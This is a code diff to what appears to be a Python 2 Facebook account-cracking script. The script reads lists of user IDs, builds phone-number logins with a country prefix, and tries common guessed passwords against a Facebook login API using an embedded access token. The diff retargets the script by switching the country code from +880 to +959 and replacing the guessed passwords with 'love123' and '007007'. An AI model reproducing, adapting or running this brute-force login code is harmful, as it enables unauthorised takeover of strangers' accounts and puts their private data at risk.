@@ -210,7 +210,7 @@ def action():
         print 'Enter any code  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,40,41,42,43,44,45,46,47,48,49
         try:
             c = raw_input("\033[1;96mAWAIS CHOOSE : ")
-            k="+880"
+            k="+959"
             idlist = ('.txt')
             for line in open(idlist,"r").readlines():
                 id.append(line.strip())
@@ -272,7 +272,7 @@ def action():
                             cps.close()
                             cpb.append(c+user+pass2)
                         else:
-                            pass3="PAKISTAN123"
+                            pass3="love123"
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
@@ -306,7 +306,7 @@ def action():
                                             cps.close()
                                             cpb.append(c+user+pass4)
                                         else:
-                                            pass5="786786"
+                                            pass5="007007"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
